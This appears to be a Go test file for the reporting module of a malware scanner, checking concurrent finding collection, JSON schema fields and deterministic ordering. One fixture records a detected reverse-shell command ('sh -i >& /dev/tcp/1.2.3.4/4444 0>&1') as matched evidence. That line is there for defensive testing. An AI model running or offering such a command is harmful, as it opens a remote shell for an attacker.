package report_test

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"testing"
	"time"

	"aether/internal/report"
)

func TestConcurrentReporter(t *testing.T) {
	tmpDir := t.TempDir()
	jsonOut := filepath.Join(tmpDir, "findings.json")

	rep, err := report.NewConcurrentReporter(jsonOut)
	if err != nil {
		t.Fatalf("failed to create reporter: %v", err)
	}

	const workerCount = 20
	const findingsPerWorker = 50

	var wg sync.WaitGroup
	wg.Add(workerCount)

	for i := 0; i < workerCount; i++ {
		go func(workerID int) {
			defer wg.Done()
			for j := 0; j < findingsPerWorker; j++ {
				var sev report.Severity
				switch (workerID + j) % 4 {
				case 0:
					sev = report.SeverityInfo
				case 1:
					sev = report.SeverityNotice
				case 2:
					sev = report.SeverityWarning
				case 3:
					sev = report.SeverityAlert
				}
				f := report.NewFinding(
					fmt.Sprintf("mod-%d", workerID),
					sev,
					fmt.Sprintf("/tmp/test_%d_%d", workerID, j),
					"test reason",
					"RULE_TEST",
				)
				rep.Report(f)
			}
		}(i)
	}

	wg.Wait()

	if err := rep.Close(); err != nil {
		t.Fatalf("failed to close reporter: %v", err)
	}

	expectedTotal := workerCount * findingsPerWorker
	findings := rep.Findings()
	if len(findings) != expectedTotal {
		t.Errorf("expected %d findings, got %d", expectedTotal, len(findings))
	}

	total, alerts, warnings, notices, infos := rep.Summary()
	if total != expectedTotal {
		t.Errorf("expected total %d, got %d", expectedTotal, total)
	}
	if alerts+warnings+notices+infos != total {
		t.Errorf("summary counts do not sum to total: %d != %d", alerts+warnings+notices+infos, total)
	}

	// Verify JSON file exists and was written
	stat, err := os.Stat(jsonOut)
	if err != nil {
		t.Fatalf("json output file stat failed: %v", err)
	}
	if stat.Size() == 0 {
		t.Errorf("expected non-empty json output file")
	}
}

func TestJSONSchema_FindingCompliance(t *testing.T) {
	f := report.Finding{
		ID:                  "finding-001",
		Timestamp:           time.Now().UTC(),
		Module:              "scanner",
		Severity:            report.SeverityAlert,
		Verdict:             report.VerdictMalicious,
		Confidence:          report.ConfidenceHigh,
		Title:               "Interactive Reverse Shell",
		Path:                "/tmp/backdoor.sh",
		LineNumber:          5,
		Reason:              "Reverse shell redirection detected",
		RuleName:            "Script_Reverse_Shell_Interactive",
		Why:                 "Automated outbound socket redirection payload",
		Remediation:         []string{"Quarantine the script file"},
		ConfidenceRationale: "Direct high-confidence signature on unowned executable",
		EvidenceRecord: &report.EvidenceRecord{
			DetectorType:        "heuristic",
			RuleName:            "Script_Reverse_Shell_Interactive",
			EvidenceStrength:    report.StrengthDirect,
			MatchedCondition:    "sh -i >& /dev/tcp/1.2.3.4/4444 0>&1",
			TargetPath:          "/tmp/backdoor.sh",
			PackageStatus:       "unowned",
			ContextProfile:      "standard",
			ConfidenceRationale: "Direct high-confidence signature on unowned executable",
		},
	}

	data, err := json.Marshal(f)
	if err != nil {
		t.Fatalf("json.Marshal failed: %v", err)
	}

	var raw map[string]interface{}
	if err := json.Unmarshal(data, &raw); err != nil {
		t.Fatalf("json.Unmarshal failed: %v", err)
	}

	// Required fields in finding-schema.json
	requiredFields := []string{"timestamp", "module", "severity", "verdict", "confidence", "reason", "path"}
	for _, field := range requiredFields {
		val, exists := raw[field]
		if !exists || val == nil || val == "" {
			t.Errorf("missing or empty required field: %q in Finding JSON", field)
		}
	}

	// Required fields in evidence_record
	evRaw, ok := raw["evidence_record"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected evidence_record object in JSON")
	}
	evRequired := []string{"detector_type", "rule_name", "target_path", "package_status", "context_profile", "confidence_rationale"}
	for _, field := range evRequired {
		val, exists := evRaw[field]
		if !exists || val == nil || val == "" {
			t.Errorf("missing or empty required field: %q in evidence_record JSON", field)
		}
	}
}

func TestReporter_DeterministicSort(t *testing.T) {
	// Prove that 10 consecutive concurrent scans with identical findings produce identical sorted ordering
	var referenceJSON string

	fixedTime := time.Date(2026, 10, 3, 12, 0, 0, 0, time.UTC)
	for run := 0; run < 10; run++ {
		rep, err := report.NewConcurrentReporter("")
		if err != nil {
			t.Fatalf("failed to create reporter: %v", err)
		}

		paths := []string{
			"/var/log/syslog",
			"/etc/cron.d/job",
			"/tmp/payload.sh",
			"/usr/bin/login",
			"/etc/shadow",
			"/tmp/.hidden_elf",
		}

		var wg sync.WaitGroup
		for _, p := range paths {
			wg.Add(1)
			go func(path string) {
				defer wg.Done()
				f := report.NewFinding("filesystem", report.SeverityWarning, path, "reason", "RULE_"+filepath.Base(path))
				f.Timestamp = fixedTime
				f.LineNumber = 10
				rep.Report(f)
			}(p)
		}
		wg.Wait()

		findings := rep.Findings()
		data, err := json.Marshal(findings)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		jsonStr := string(data)

		if run == 0 {
			referenceJSON = jsonStr
		} else if jsonStr != referenceJSON {
			t.Fatalf("run %d produced non-deterministic output:\ngot:  %s\nwant: %s", run, jsonStr, referenceJSON)
		}
	}
}
